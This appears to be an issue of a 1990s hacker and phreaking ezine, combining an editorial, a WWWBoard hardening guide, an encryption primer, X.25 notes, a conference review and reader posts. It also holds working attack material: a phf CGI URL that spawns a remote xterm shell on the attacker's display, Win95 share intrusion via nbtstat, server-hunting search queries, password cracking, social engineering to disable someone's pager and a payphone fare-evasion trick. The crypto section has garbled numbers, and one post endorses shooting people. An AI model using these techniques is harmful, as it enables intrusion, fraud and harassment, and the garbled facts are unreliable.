³ Spreading the knowledge - by KungFuFox ³ 
ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

It's survived for 14 issues, the first 3 spoken of only in legend. It's 
succeeded where others have failed. It's stood the test of time. It's past
its first birthday. Hooray for THTJ. A lot goes into making a publication 
like this, and even more goes into putting it out on time. Funny how that's
not the norm in the world of ezines, coming out on time. I guess it's the
pressure of a deadline that's scared people away from the idea. 

Taking a look at the booming industry of ezines out there, I can't help but 
notice that not many of them make it very far. For whatever reason, they fall 
below the horizon far sooner than they should. Maybe the initial motivation 
to make the zine was no longer there, or maybe the editors didn't get enough 
articles to keep publishing; something just didn't go right. They all started
off with the same goal, to bring information to the public. I think it's 
noble that people are still out there trying to spread the knowledge, because 
I think that's what ezines are for. They help the community by giving them 
the knowledge that they would have a great deal of trouble getting otherwise.

As I reflect on the maturity of THTJ, on the changes it's gone through over 
time, I do feel a good deal of pride in its success. From its early days of 
paper form, through its evolution as an ezine, and to the present point, its 
message has stayed the same; spread the knowledge. We spread the knowledge 
every month, with the seemingly endless stream of articles that are sent in 
from everyday people like you, from the community. We sure as hell couldn't 
survive without the help of our reader/writers. 

This zine has kept going because the idea of spreading the knowledge isn't 
extinct, and hopefully it never will be. That's what freedom of speech is all
about, isn't it? Not about burning flags, or dressing in drag, or whatever.
It's about being able to exchange information without barriers, without  
censors, without the challenge of fighting your allies to learn. If there 
were no ezines, if nobody out there had the motivation to spread the 
knowledge, if it was an every man for himself community, we'd be censoring
ourselves by holding the knowledge away from the people who want it, who can
use it. 

Zines like Phrack and PLA have kept the scene informed, and laughing, for
the duration of this decade (and in the case of Phrack, for a good chunk of
the 80s as well). It is their success that has brought many a newbie into the 
scene, just because of the openness and freedom of knowledge exchange that 
these zines have promoted. Though 2600 is not an ezine, and not free, it
has kept the public informed for many years. It has also indirectly 
influenced the ezine industry for some time now, forcing those who want the 
knowledge to stay free to make their own ezines, and keep the knowledge 
flowing. 

Many a zine have come and gone, making maybe 1, maybe 2 issues. And of those 
many, perhaps 1 in 20 of them makes a 3rd, and a 4th, and keeps the knowledge 
flowing, but just 1 out of 20 is all it takes to keep the scene alive. There
are some newcomers out there, starting out like the many before them, and 
they're continuing the tradition, taking over where others have left off.
Zines like System Failure, Zero, Ocean County Phone Punx, and Confidence 
Remains High. They all show promise, and I'm sure there are many more like 
them that I don't even know about. It can only be hoped that this trend of 
knowledge spreading never ends, and should it ever, by the hand of some 
contemptuous hypocrite, we'll not be the disgraced for trying.

The Havoc Technical Journal is going to continue to spread the knowledge for
as long as it can, but nothing lasts forever, and times do change. We're 
aiming to better ourselves, to make this publication as informative, as 
interesting, and as entertaining as possible. The opinions of our readers are
the best way for us to judge our strengths, our weaknesses, to determine what
it is we're doing right, and what it is we need to be doing. Flame us if 
necessary, just let us know what you want to see, what you don't want to see
and what it is you see that you think is really swell. Operators are standing
by!

³ Securing your WWWBoard - by Black Sol ³ 
ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

Note: this is intended for those with their own websites;
and use Matts WWWBoard CGI Script (http://www.worldwidemart.com/scripts)
This is a perl script for a message board system, and as all programs,
carries bugs which can be easily exploited. If you have this perl script
running on your site, or plan on it, this text may be almost necessary for
its safety.

Well, more and more sites these days appear to have the WWWBoard script which
allows any person to post a message to your board, and let others read it. 
This is considered a very convenient tool, but, as everything, has flaws and
can be exploited. The first part of this is the security issue brought up 
with the associated WWWAdmin program that goes with WWWBoard, and second, an 
issue of editing the PERL Script itself for better security.

WWWAdmin Hole: |
---------------+
The Exploit: 
Used to remove messages from your board, WWWAdmin is used very commonly when
a person uses WWWBoard. The default file name is
                        /wwwboard_Directory/wwwadmin.cgi or www.admin.pl

You also must have a user name and password, which is stored in the 
passwd.txt file. This can be a very big problem. The method WWWAdmin uses to 
encrypt the password is the same as normal unix passwords, so therefore, 
password crackers, like CrackerJack or John the Ripper can be used to crack 
it.

The way it is displayed is this:
WebAdmin:aepTOqxOi4i8U
WebAdmin is the username and aepTOqxOi4i8U is the encrypted password. If you
put this into unix format, lets say..
WebAdmin:aepTOqxOi4i8U:275:15:Emmanuel Goldstein:/usr/homos/egold:/bin/csh

and then, used sturdy old John the Ripper to crack it, you'd come up with the
password WebBoard. Then, you'd just have to go to lets say
www.host.com/wwwboard/wwwadmin.cgi or wwwadmin.pl and use WebAdmin and
WebBoard as the password, and you can edit and delete all their stuff..

How to Fix it:
Don't panic because you might get hacked by some ego-maniac kid hacker who
doesn't have anything better to do then ruin other peoples fun, this can be
easily fixed. There are several methods, i suggest using all of them for
maximum security.

Method #1 - Don't use the standard wwwadmin.pl or wwwadmin.cgi for the name.
Use some random numbers and letters when uploading this to your server, for
instance, make it wadawambrblah.cgi. This way, only you will even know where
the admin script is, so even if they get the password they won't know where 
to go!

Method #2 - Don't use the standard passwd.txt for the passwd file. Change it
also to something random like sdihff.bla - NOTE - you must also make this
change in the WWWAdmin script, under the location for your passwd file. More
details in the WWWAdmin readme file..

Method #3 - As soon as you upload it, IMMEDIATLY change the username and
password! And do not use common words, most words can be found in wordlists,
which basically means, you can still get hacked..use random names, like
ajgndnbvfd for the password, etc. etc., you get the point (i hope). Make it
LONG and use numbers as well, like a4mg4msdfsd9as9.

Note - be sure to keep your passwords written down, so you can remember them!

Method #4 - When you change your password, make sure it is more then 8
letters+numbers. Password crackers crack up to 8 characters, so, if your
password is longer then that, and someone gets your password file; they can
only crack the first 8 letters/numbers, and they can't get the rest of the
password.

Method #5 - Modify your PERL script so only ip's from your ISP (internet
service provider) can access the wwwadmin script, whatsoever. Note - more on
this below!

Method #6 - Chmod your passwd text file and even wwwadmin cgi script so that
nobody can access it, and then when you need to use it, you can chmod it back
to world readable/executable.

For example, log in to your shell, and then do the following:

-+-
cd wwwboard (wwwboard being the name of the dir everything is in)
chmod o-rwx passwd.txt (passwd.txt being the name of the passwd file for
                        wwwadmin)
chmod o-x wwwadmin.cgi (wwwadmin.cgi being the name of the wwwadmin script
                        file)
-+-

That's all. now if someone tries to access your WWWAdmin or your password 
file, they will get a Forbidden Access error. However, so will you. So, when 
you want to use your wwwadmin script, go back to your shell and do this:

-+-
cd wwwboard
chmod o+rwx passwd.txt
chmod o+x wwwadmin.cgi
-+-
Its as simple as that.
                              
Modifying the PERL Script for more security:  |
----------------------------------------------+
In most situations, people using WWWBoard do not know PERL, the programming
language that it is written in. Knowing PERL can benefit you greatly. What
are some things you could do if you knew how to edit the perl script?

1) Ban certain people from using your board

2) Ban all people from a certain internet provider from using your board

3) Stop other people from using your nickname/handle

4) Record the IP, Internet Address, Web Browser, time and date, and the
   message that person posted; to a file each time somebody posts.

5) Change the background colors, background appearance, and the general
   appearence, and layout of the board to YOUR liking.

6) Display information such as a persons IP and web browser in their post.

7) Require a username and password to make posts.

8) Stop other people from accessing your WWWAdmin script.

Unfortunately, to describe how to actually DO those things it'd take another
text in itself :) You can check out this site for some pointers with perl:

http://www.ora.com/catalog/pperl2/excerpt/ch01-01.htm

Until then, I can include one method you can use. It is pretty easy to
include somebodies IP or host in a post. Start off with these two lines, in
the top, with the other variables:

# Start perl sample
$host = $ENV{'REMOTE_HOST'};
$ip = $ENV{'REMOTE_ADDR'};
# End perl sample


Those two lines will put the persons IP and host into two little variables.
Now, in the procedure where it writes to the html file, you can include those
two variables to display the poster's info. The procedure to put this into is
new_file If your unsure of where to put this, just look for a print NEWFILE
"blah blah\n"; statement..you can look for where it says something like
"posted by $name" or whatever, and you can just add $host or $ip into the
line somewhere.

³ Hacking Win95 With NBTSTAT - by W3|rd ³ 
ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

Requirements for the hack to work:
Windows 95 & the Victim must run NETBIOS and have "sharing" on their hard 
drives.

   First type 'nbtstat -A x.x.x.x'

   If your lucky you'll get something like this.

        NetBIOS Remote Machine Name Table
    Name               Type         Status
 ---------------------------------------------

 ^M0REBID       <03>  UNIQUE      Registered
 MAC Address = 44-45-53-54-00-00

   Remember the first UNIQUE name here.

   Now create 'lmhosts' in your windows dir.
   it should look like this:

x.x.x.x ^M0REBID

   Then you purge nbtstat like this: 'nbtstat -r'

   Then goto Find -> Computers
   on the Start Menu in Windows 95.
   Type in the UNIQUE name and search.
   Then if found , double click on the name , and if you get up a window with 
   for example C and D .. you will have Access to his harddrives.. ;)

   You may now read his/her files ... and remember be creative... ;)
   (But remember , some people might have sharing on..but with pwd!)

³ More on cgi-bin holes - by ]NiCK[    ³ 
ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

1 - The largest server database helps exploit phf
*************************************************

     I have appointed: ALTA-VISTA ! :) yeah ! if you know the syntax of
     this websearch well enough, you can succeed to have a list of more
     than 3000 insecure servers with this method, simply by typing:

     http://altavista.digital.com/cgi-bin/query?pg=aq&what=web&fmt=.
     &q=link%3A%22%2Fcgi-bin%2Fphf%22&r=&d0=&d1=
     (type this all in on one line)

     Too easy! Isn't it? Also, you can modify it to search for php.cgi,
     webgais, or others such as view-source...
     
 Note:  Sometimes, some servers won't work... but its just because the
        database isn't updated every day.


2 - Other stuff to exploit websearchs
*************************************

     I love the "Yellow Pages" of organizations, enterprises, or companies
     like for instance Adminnet (www.adminet.com)... its filled with kewl
     insecure web servers.. But the problem is that it's not very
     interesting to scan manually... So, I wrote a little program to change
     the html index of web servers into a list of exploitable servers for
     phfscan or phpscan...

     Here is a little unix script:

--
if [ $# = 0 ]
then
echo "Usage: html2list file.html" >&2
exit 1
cat $1 | grep '"http://' | tr '"' '\n' | grep '^http://' | cut -c8- |tr '/'
'\n' |grep '\.' | grep -vi '\.html\|\.htm' |sort -u > $1.list
        (one again, the last 2 lines need to be moved up together)
--

 Note:  You can change/update it to a better way of scanning...


3 - Xterm with phf
******************

     Cracking the /etc/passwd ! ok... but there are better things to do
     than waste your time. This attack consists of using Xterm with phf.
     So, of course Xwindows must be present on the victim server, and you
     must also be running it. While in Xwindows, write this: 'xhost
     +www.victim.com' This is so your machine will accept connections
     from victim.com... You can simply type 'xhost +', but it isn't really
     secure... After, you must know what os www.victim.com is running,
     so you can guess the path of Xterm.
     
     Here are some default Xterm paths for a few systems:
     
   AIX  : /usr/bin/X11/xterm
   HP-UX: /usr/bin/X11/hpterm
   Linux: /usr/X11R6/bin/xterm
   SunOS: /usr/openwin/bin/xterm

     You can also use: 'find /usr -name xterm' or again 'whereis xterm' if
     you have a shell on the machine.

     Finally, once you have found the path, you can run xterm via phf like:

     http://www.victim.com/cgi-bin/phf?Qname=a%0a/usr/openwin/bin/
     xterm%20-display%20your.ip.com:0    (combine these two lines)

     Wait a few seconds... and whoop, a shell from the victims server will
     appear in your Xwindow. :) Usually you become an user Nobody, but
     sometimes, if the http daemon runs in a root shell, your become root,
     or www sometimes.. The best thing is that your access is not logged
     in the lastlog or wtmp... Very clean exploit !

Have PHFun ! :)

want a little more info about it.

1) What is Encryption?

Encryption is simply the encoding of messages so that they cannot be read by 
anyone who does not know how to decipher it. Governments and militaries have 
been using codes to make their messages unreadable for many years. For 
example, Caesar used a code to send military messages that was simply a shift 
of the letters in the message three spaces down in the alphabet (an A becomes 
a D). In cryptographic language this is known as a shift cypher.

The properties of a good cryptosystem are analogous to that of a normal lock. 
A good system will have a very large key which is one of a large number of 
keys (termed keyspace). It will also provide cyphertext (encrypted plaintext) 
that appears random and stands up to known decryption attacks. Lastly, the 
system should be suitable to the function for which it is intended. For 
example, if a message is to remain secret for ten years or more, then the 
system should take into account the future speed of computers and their 
corresponding ability to attack the system. However, except for classified 
government information (and maybe the Coca-Cola secret recipe), the reality 
is that the relevance of most corporate information traveling over networks 
is measured in days or weeks, and not decades.

2) How Does Encryption Work?

Most encryption algorithms are based on the concept of complex mathematics 
that work in only one direction and are generally based on the difficulty of 
factoring very large numbers (keys) that are used for the encryption. These 
large numbers are the product of large prime numbers. For example, anyone can 
multiply two large prime numbers to obtain a result, but it is very difficult 
for someone else to factor the large number to get back the two primes. This 
is to say that mathematicians have yet to figure out a method for reversing 
the math effectively. In this way, cryptography has been a secure method of 
ensuring data confidentiality over computer networks.

3) Brute Force Attack

The traditional method of breaking complex mathematical codes is through 
brute-force attacks. This method is mathematically the easiest to perform, 
but relies on vast computer processing power and is therefore the easiest to 
defend against. A brute force attack tries every possible combination of keys 
in order to unlock the encryption. Therefore, simply increasing the keyspace 
will increase the amount of time needed to mount a brute force attack. The 
reality is that a brute force attack is not a method which will ever be used 
to decode cyphertext. Some quick calculations relating computer speeds and 
key length will yield code-breaking times that exceed the expected life of 
the universe.

The brute force method needs a sample of unencrypted text for the computer to 
compare each decryption attempt with the actual text. This can be easily 
obtained by knowing the nature of the messages being intercepted. For 
example, all Microsoft word files will have a set of standard information 
(bytes). How the decryption functions is easy. A key that is 128 bits long 
will have 2128 possible values. Therefore, assuming that a very fast computer 
that can try one million keys per second (consider that attempting a key 
requires many instructions) it will take 225 years to try all of the 
combinations with a 50% probability that it will be found in the first 224 
years (remember that the universe is estimated to be 210 years old). (Bruce 
Schneier, Applied Cryptography c.1995).

4) Factoring Techniques

The more feasible form of attack will come from mathematicians refining 
existing and developing new factoring techniques. These methods have been 
used to show potential vulnerabilities in key-based encryption. However, they 
still require massive computer power and long time-frames to break the 
encryption. For example, a 129-digit number was factored at Bellcore labs in 
1994. This used the idle time on 1600 computers around the world, over a 
period of 8 months using a computation called the quadratic sieve. The 
authors estimated that they used .03% of the computing power of the Internet, 
and believed that, with a highly publicized event, they could acquire 100,000 
computers (approx. 2% of the Internet) without resorting to illegal or 
unethical efforts such as an Internet worm.

5) How Long Should a Key be?

The security of a cryptosystem depends on the strength of the algorithm and 
the length of the key. The strength of the algorithm is difficult to 
understand. However, understanding the methods of how the keys are decrypted 
provides some clues as to it's strength. Knowing that all numbers can be 
represented by a set of primes, encryption techniques rely on the difficulty 
of factoring very large numbers into their respective primes. Lets look at a 
very simplified example (cryptologists will undoubtedly cringe at the over
simplification):

Suppose we have number n represented by x and y such that n = xy. The 
quadratic sieve method works by first assuming that the numbers x and y are 
close to one another on a number line. Successive steps either prove or 
disprove this and search out the next numbers. Therefore, effective 
encryption will create keys which are not close to one another. However, the 
numbers cannot be so far apart as to have the one of x or y set to a very 
small value. Effective encryption-based key generation will generate the keys 
randomly, but also discard those keys which will be susceptible to 
factor-based decryption systems.

What is involved in factoring a number? Anyone with a grade six education (or 
a calculator) can easily multiply together two numbers. Anyone with a grade 9 
education (and who remembers it) can factor a small number into its primes. A 
prime number is any integer which is only divisible by itself and by 1. For 
example, the sequence of the first seven prime numbers is: 1,2,3,5,7,11,13...

Lets say we express the number 24 as a set of its primes. This is simply 
2*2*2*3 = 24. Seems simple enough. Now, for those of you who think this is 
easy, try entering the RSA factoring challenge and they will award you a 
prize if you can do it on very large numbers (see the link at the end of this 
document).

Another method called the general number field sieve can factor numbers 
approximately 10 times faster than the quadratic field sieve, but is only 
faster for larger numbers (greater than 110 digits). This method hasn't been 
refined to the degree of the quadratic sieve but, with time will likely be 
the method of choice for factoring large keys.

Factoring large numbers is very hard, but is becoming easier therefore 
predictions based on security required for long term encryption cannot be 
made. However, most people don't require their data to remain secure for 100 
years. For example, information about stock market conditions may only be 
relevant for a few days. Decisions based on that information need only be 
protected for a few hours. At the end of the day everyone's trades become 
known anyway. For a manufacturer, design specs. need only be kept secret 
until product launch. For the longest-term secrets, such as military secrets, 
key length should be based on the computing speeds at that time and the 
projected future increases. Two general rules of thumb is that computing 
power increases by a factor of 10 every five years and it is always best to 
be cautious when making predictions. 

6) Mounting an Attack

With respect to computing methods, a hardware or a software based attack can 
be mounted. Hardware designers and cryptologists have designed machines 
specifically for breaking codes which can greatly increase the rate at which 
a code is broken. This involves hundreds of parallel processors working on
different 'parts' of the key.

A software-based attack is much slower but is also much cheaper to mount. For 
example, using an algorithm with a 56 bit key, a software attempt run on 512 
workstations capable of running the algorithm at a rate of 15,000 encryptions 
per second, running 24 hours per day would require 545 years to test all 
possible numbers (Bruce Schneier, Applied Cryptography c.1995) . Importantly, 
with a 40 bit key (the only key length currently allowed for export under 
federal legislation) a similar network would take just under two days to 
complete the attack.

A 128 key makes brute force cryptanalysis effectively useless, even when 
factoring estimates for increases in the number of networked computers in the 
world and increasing processor speed. However, it is still susceptible to 
factoring methods when distributed among several computers. The next logical 
question is, why not use keys with a very large number of bits (>2000)? The 
answer lies in the tradeoff between security and usability. The longer the 
key length the longer the time needed for encryption. Encryption over a LAN
environment should not be a bottleneck in the communications.

7) What is RSA?

RSA is the industry standard for public key cryptography. Its algorithm is 
based on the difficulty of factoring large numbers. Encryption is performed 
'one-way', indicating that f(x) is the encryption function but f-1(x) is very 
hard to compute. 

8) What is DES?

Data Encryption Standard (DES) is the standard for private key encryption and 
is recognized by international standards organizations such as ANSI and ISO. 
Standard encryption schemes are needed to ensure interoperability of systems 
for the same reasons standards are needed for all network applications. The 
most important criteria for a standard (and in fact any) cryptographic scheme 
is that the security must rely on the key and not in the secrecy of the 
algorithm. By the definition of encryption, simply deducing the algorithm 
should not make it any easier to decrypt messages. 

DES uses the same key for encrypting as decrypting. This encryption is not 
based on the difficulty of factoring large numbers but is based on a set of 
non-linear transformations. The key can be any 56-bit number and there are 
few weak keys. A good example of a weak key is one that is all 0's or 1's. 
This encryption is not based on the difficulty of factoring large numbers but 
is based on a set of non-linear transformations. DES is a single combination 
of operations, substitution followed by permutation, performed on the message 
based on the key and on a set of constant values (the algorithm). This 
function is repetitive and so can be easily implemented using hardware, 
making it a very fast solution for encryption.

9) What is a Substitution?

A substitution is quite easy to understand. Letters of the alphabet can be 
randomly substituted for other letters according to a key as follows:

a b c d e f g...
q s l b z e r...

This substitution key is held by both the person coding the message and the 
person decoding the message. The key is simply the substitution of the number 
of letters in the alphabet (and could include the space-value). Therefore the 
number of permutations is simply 26!. A very large number which could not be
analyzed by brute force. However, this simple type of encryption can easily 
be analyzed using other methods.

10) What is a Permutation?

A permutation does not involve changing the values of the plaintext. A 
permutation alters their position but leaves the character values unchanged. 
The method is performed mathematically using a permutation matrix in which 
each row contains only one '1' for the row of size 'm'. The best way to 
illustrate this is through a simple alphabetic example:

We will use the following key (m=4)Value: 1 2 3 4 Key: 3 4 1 2 to encrypt the 
following: howareyou. 
First arrange in groups: howa|reyo|u 
Perform the permutation: wahoyoreu 
Decrypt with the inverse key.

DES functions by first dividing the initial text (bitstring) of length 64 
bits, into two halves (32 bits). The 32 bit string is expanded to 48 bits. An 
initial permutation is performed on the bitstring according to a function
derived from the encryption key. The DES algorithm then performs a set of 
constant substitution functions using 8 S-boxes followed by the permutation 
(An S-box is the term for a 4x16 matrix which is used to perform the 
substitution on the bitstring of length, 48 bits). This is followed by a 
round of key-based encryption using 48 of the 56 bits in the key. The whole 
set of functions is repeated 16 times.

1. What is X.25 ?#
##################

     Different Network, really far for links use that protocol and equipment 
named X.25, lots of networks like Transpac, Datapac, Tymnet use that X.25 
Protocol.. It uses a hardware named PAD X.25 
(Packet Assembler/Dissassembler). Users are connecting to those PADs from a 
phone number with a or from a tcp/ip gateway from Internet, or from
another ways.. and from those PADs, they connects the X.25 servers with 
the command connect (c), you can also configure a lot of parameters for your 
connection (when you'll lost the connection, parameters will be defaults 
again.) with the commands full or half (full duplex, half duplex), the 
command set for the PAD parameters, the command par? is for displaying the
PAD parameters, stat displays your port address on the PAD. for 
disconnecting, here is the command bye or disconnect.. with that hardware, 
when connecting it, setting a right user ID, (if you can connect reverse 
charging calls host), you must know that any network has a prefix (dnic) for 
instance : 02080 is for Transpac in France.. 03110 is for telenet in USA. (of 
course, with the USER ID is required a PASSWORD.. that would be so easy ID 
xxxxxx is for the user id, and it will ask for a password after.)

2. here are the prefixs of some networks you can connect o with an x.25 pad:#
#############################################################################

     02080 is Transpac / France
     02342 is PSS / England
     02405 is Telepak / Sweden
     02624 is Datex-P / Germany
     03106 is Tymnet / USA
     03110 is Telenet / USA
     04251 is Isranet / Israel
     05252 is Telepac / Singapore

. Talking about Transpac / France (02080) :#
############################################

     Transpac is the X.25 French network that anyone can use to connect to a 
PAD in france with the numbers 3617 3615(those are expensive to call) 3614 or 
3613 (less expensive ones),...with those different numbers, you can connect 
to different services.. the most interesting services are on the expensive 
numbers and the government/companies ones with passwords and logins are on 
the less expensive ones. those hosts have an x.25 address and a nabx25.

. What is a nab X.25?#
######################

     a NABX25 in french mean Nom Abrégé X.25, in american language, i will 
call it an X.25 Abriged NAME, that means for each nua (x25 adress), you have 
a name that u type it on those services to connect to it quickly without 
having to remember its nua (anyways, french dont know nabx25 is for,
they can connect to the hosts with the nua) 
example : for nabx25 TEASER (french server of Upload / Download in 1200 
Bauds), has the nua of 0208078270373.
On the minitel keyboard (Terminal + Modem to call those 361x numbers, you 
can directly type the nua, replacing the 02080 by 1 (1 is france) so it 
would be 178270373 )


. What is minitel and Videotex ?#
#################################

     "Minitel" is the name of that 'modem and terminal' integrated for 
connecting Videotex phone numbers like 3617, 3616, 3615, 3614, 3613, 
3606xxxx, 3605xxxx ... it is sold and rented by France Telecom in their 
agencies but can be easily replaced by an US Robotics sportster, by setting 
on the V.23 modulation (1200/75 bauds) changing the register S34 to 8 with 
ATs34=8&w (&w for saving the new settings.) or by a V.23 modulation modem 
called CAP.23, not expensive at all.. 


     Videotex is a Graphism Virtual Terminal.. not ansi like the VT, but 
Videotex, with a lot of graphics functions i explained in some thtj issues, 
before.. you can anyways download one of those videotex terminals..

     for modems connecting, they are named olicom, minitel.. (www.yahoo.com, 
     search to minitel/videotex)

     for telnet connecting (to those tcp/ip minitels), they are on 
http://www.minitel.fr or on www.mctel.fr (VTX plug is the name of that 
program for win95/3.11)

     For Linux, Videotex terminals exist to save videotex pages and for
connecting via modem or telnet (check www.yahoo.com here too..)

3. Some Telnet servers to connect for accessing Transpac nabx25 or nua :#
#########################################################################

     first, you can connect free that MGS nab25 server, which permit you to 
search (like yahoo) any nabx25 server for the domain you want, by connecting 
on port 25 on www.minitel.fr , with the login minitel.. If you want more 
services, with access to a x25 pad, you need to have that damn credit card.. 
or to hack some ID and PASSWD, the security of that server is hum.. not too 
bad, it got totally hacked one time before if i remember, but now it seems 
pretty secure, logs are checked by france telecom guys every days and the 
(new?) root seems to be more intelligent. that "videotex" site can allow you 
to work on it with ansi, so your telnet client will work on it.

     Secondly, strictly videotex, you can connect with VTX-PLUG to 
www.mctel.fr , to those X.25 PADS, first, FREE you can connect the services 
MGS and 3611 (MGS is that search engine for any nabx25 server and 3611 is a 
search engine for any info of any guy in France) (VTX-PLUG connect on port 
516 of www.mctel.fr) or connect services 361x with an ID and PASSWD.. 

     With you damn modem, you can also connect to the 361x services from 
foreign country with a modem videotex terminal (or minitel) to +33 8 36 43 15 
15 for 3615 service, +33 8 36 43 14 14 for 3613 service, or +33 8 36 43 13 13 
for 3613 service. You can connect a good old x.25 pad by calling +33 8 36 06 
44 44 (Transpac one) , for connecting to that old compuserves, can be called 
those ones too +33 8 36 06 96 96 (9600 bauds) or +33 8 36 06 24 24 (2400 
bauds one) .

4. How do we connect servers.. method ?#
########################################

We connect servers with that first number of the nua (1 for france.. the 
others numbers from a 361x service are forbidden.. only connect Transpac or 
Gateways) 1 is France(or 02080 if you connects it from a telenet or another 
network)

after that, we put the 2 numbers of the departement where is located the 
server.. (a departement is like a state in the US.)

. Here is the France Departements list:#

After that, the next 6 numbers are the servers numbers.. mostly if you scan, 
you will find servers on 060xxx 021xxx 270xxx 118xxx 190xxx 001xxx 911xxx 
201xxx 010xxx 160xxx, but well remember that you can find servers on any 
xxx000 to xxx999.

For instance, if you need to know the amora x.25 server adress, try to scan 
121xxxxxx (1 is france , 21 is cote d'or, where is located amora company)
if you need to scan for a government or france telecom x.25 server, scan on
175xxxxxx (1 is france and 75 is paris.. where governement is mostly..)
for another Taxes server, try on 167xxxxxx (1 is france and 67 is 
Stransbourg, where is a Taxes server.) Do a random scanning, nua scans are 
illegal and detected in France.

After those numbers, we can (not needed sometimes) 2 nod numbers for 
choosing the service you want to connect in that host.. (on the nabx25, the 
nod have a name too which can be another nabx25 for the same host.) like 
13506031801 is for connecting the restricted service of a french cops/lame 
server.

³ Beyond HOPE review - by AlienPhreak ³ 
ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

As some of you might of heard Beyond Hope was held in the Big Apple a couple 
weeks ago. I can personally say it sucked. There were only a few occasions 
when I actually enjoyed being there. 

I thought there would be much more hacking and phreaking going on but it 
ended up with the juarez puppy in everyone coming out to take advantage of 
the T1 line Nynex so anonymously supplied. I learned only one thing which was 
(I don't know much about cellular) how to scan and listen in on peoples' 
cellular calls through a motorola flip phone. 

I did enjoy the Bernie S. and Phiber Optik speeches. I'm sure we all know 
about Bernie S, he seemed very intelligent but I think he did have illegal 
possessions (aka Red Box) and in all honesty boxing is outdated and rather 
lame. He certainly wasn't what I'd consider a phone wiz. Still there was no 
reason for him to go to five high security prisons serving time with some big 
black guy named Bubba. Phiber Optik is someone that I actually admire, 
because he knew his shit.

After a while the cDc came on and just ruined everything. What can I say 
about Death Veggie? He's fucking stupid! Also Beyond HOPE was sponsored by 
2600 *coughselloutcough* So I saw some t-shirts going around and them selling 
more of their FREE INFORMATION, but I had to pitch in and buy an "owned" 
shirt. I *might* go to the next HOPE if they keep the cDc out of it and have 
a decent lineup.

³ Tatoo pager info and more - by memor ³ 
ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

A little way to call Tatoo pagers easily from French payfones
by memor/hbs memor@mygale.org 
http://www.mygale.org/00/memor
******************************

!Remember!
----------

Tatoo is a pager made by France Telecom and Motorola available in France.
it is called via the number 0604xxxxxx
or from a foreign country it is +33 604xxxxxx
ATDT 0604xxxxxx,,,,numberyouwantthepersoncall,,,# can be a way from a
modem to call and send a numeric page
With an operator, u can send alphanumeric messages.
With a "manual" way, u use your phone and call
the 0604xxxxxx, you wait for the recorded voice asking in French
to type the number you want to be called at, you type the number
and after it, type # and Hang Up, the message will be sent. The person
will receive it 10 mins after, time for the slow france telecom 
relays and computers to transmit the numeric message.

!Here is how to invalidate a Tatoo from an annoying dude
(please keystroke, dont do it on me hehe)!

well, you have to phone that number reserved for tatoos users which
is.. 08 36 60 40 20 (+33 8 36 60 40 20 for foreign countries i guess)
ask the operator with your french voice to,
"je suis le tatoo numero 08 06 xx xx, quelle est ma zone de reception"
you will ask the operator where does the pager receive messages
she will answer a "district" like paris, or south of france, or another
thing..  and tell her after that "je demenage en zone <autre zone>"
you will tell the operator to change the district to another one,
so the pager wont receive message after that.. and the annoying person
wont be contacted again.. 

now, something about French payfones..
you use a "telecarte" or telecard with fone money utilities..
1 unit = 0.73 ff

its a normal telecard

*******************************
*                      *****  *
*             chip---> *   *  *
*                      *****  * -> insert it in the payfone thing...
*                             *
* some ads here               *
*******************************

the payfone works like that with the telecard..

you dial the fone number you want to call
the payfone checks if you called a free fone number or a number you have to 
pay for; if its a free fone number, it continues without checking if a card 
is in the payfone.

**if its a pay fone number
the payfone will verify that a telecard is in the payfone
if not.. it will disconnect you and beep
if yes:
you connect to the number
<a delay>
the payfones send the signal to kill a unit in the telecard
<a delay>
payfone waits the telecard send the signal that the unit got killed
if signal received.., continue conversation at phone
if signal lost.., disconnect the phone conversation
if signal that telecard is empty.., °see if signal lost

well.. during those delays you have time to put a little paper
between the telecard and the payfone reader/writer like this:

                 /¯reader/writer of the payfone
---------***\/***----------
-------------------------------------< paper
---------********- <- telecard with *** chip

and so you will have 5 seconds (the delay) to type the number you want the 
person to call you back and '#' before the payfone see that there is no card 
and hang up on you.. but well that service costs like 1$us for a numeric
message so it can be interesting not having to pay for it :)

ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

The problem is this: a phreak named moloch tried using 800-487-9240 to do an 
ani.  The number returned a recorded message stating "ARU ID is echo-7-
alpha". Two other messages could also be heard when dialing this number, 
"caller interactive is 9900" and "line number is 0". What do these messages 
mean? It's the question the telcos can't even answer... after conversations 
with Bell Atlantic, Lucent Technologies, AT&T, MCI, and his local telco, 
moloch has yet to find the answer he's looking for. He's been told by the 
local branches that it's a network code, and the larger telcos say it's a 
trunk issue. He's gotten the same messages when attempting an ani from 
payphones, regular phones, and on the wm.edu digital phone network. He's 
tried special services, network services, hardware services, residential 
services, long distance services, general tech support, and trunk support, 
but to no avail. Have any of you, the readers, heard any messages like these? 
Do you know what these messages mean? If so, let us know, or you can answer 
to moloch yourself, at craqhore@multic.ml.org

Help your fellow phreak in his time of need! You'll feel better about 
yourself, even if you think you're still a loser!

Subject: hi

hello everyone.  Id be f0k. (no, Im not black, but I felt the need to refer
to myself in third person, using the word 'be') I will list to you some of
my beliefs, so if/when we ever talk, you'll know alittle about me.

1) I feel any and all information should be free.
2) I believe anyone who stands in the way of my gathering of information
 is a communist/socialist pig.  These types of ppl should be shot on
 sight.
3) I dont believe in the devil... or god.
4) I think anyone who believes in god is weak, selfish and inferior
5) I know Im right, always (unless I change my mind, inwhich case...
 I get to be right some more =])
6) I believe in Zero Tolerance politics.  If you fuck up, you die. If you
 cant provide for yourself you die.  Let the
